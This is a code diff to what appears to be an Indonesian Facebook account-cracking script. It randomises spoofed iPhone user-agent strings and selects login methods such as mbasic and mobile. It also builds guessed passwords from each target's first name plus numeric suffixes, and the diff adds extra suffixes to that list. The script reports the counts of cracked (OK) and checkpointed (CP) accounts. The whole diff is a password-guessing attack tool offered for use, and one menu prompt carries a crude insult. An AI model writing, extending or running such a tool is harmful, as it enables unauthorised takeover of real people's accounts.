@@ -65,18 +65,18 @@ for xd in range(10000):
 	ugen2.append(uaku)
 
 
-	aa='Mozilla/5.0 (Linux; Android'
+	aa='Mozilla/5.0 (iPhone; CPU iPhone OS'
 	b=random.choice(['6','7','8','9','10','11','12'])
-	c='Galaxy S4 Zoom'
+	c='iPhone OS'
 	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
 	e=random.randrange(1, 999)
 	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	g='AppleWebKit/605.1.15 (KHTML, like Gecko) Version/'
 	h=random.randrange(73,100)
 	i='0'
 	j=random.randrange(4200,4900)
 	k=random.randrange(40,150)
-	l='Mobile Safari/537.36 OPR/16.0.1212.65583'
+	l='Mobile/15E148 Safari/604.1'
 	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
 	ugen.append(uaku2)
 for x in range(10):
@@ -641,12 +641,12 @@ def setting():
 	elif hc in ['']:
 		print('>> Pilih Yang Bener Kontol ')
 		setting()
-	elif hc in ['2','02']:
-		method.append('free')
+#	elif hc in ['2','02']:
+#		method.append('free')
 #	elif hc in ['3','03']:
 #		method.append('touch')
-	elif hc in ['4','04']:
-		method.append('mbasic')
+#	elif hc in ['4','04']:
+#		method.append('mbasic')
 	else:
 		method.append('mobile')
 	print('')
@@ -692,10 +692,11 @@ def passwrd():
 				if len(frs)<3:
 					pwv.append(nmf)
 				else:
-					pwv.append(nmf)
 					pwv.append(frs+'123')
 					pwv.append(frs+'1234')
 					pwv.append(frs+'12345')
+					pwv.append(frs+'123456')
+					pwv.append(frs+'1234567')
 			if 'ya' in pwpluss:
 				for xpwd in pwnya:
 					pwv.append(xpwd)
@@ -711,7 +712,7 @@ def passwrd():
 			else:
 				pool.submit(crackmbasic,idf,pwv)
 	print('')
-	cetak(nel('\t[cyan]✓[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan] ✓[white] '))
+	cetak(nel('\t[cyan]✓[green] Crack Selesai , Jangan Lupa Bersyukur[cyan] ✓[white] '))
 	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
 	print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
 	print('')
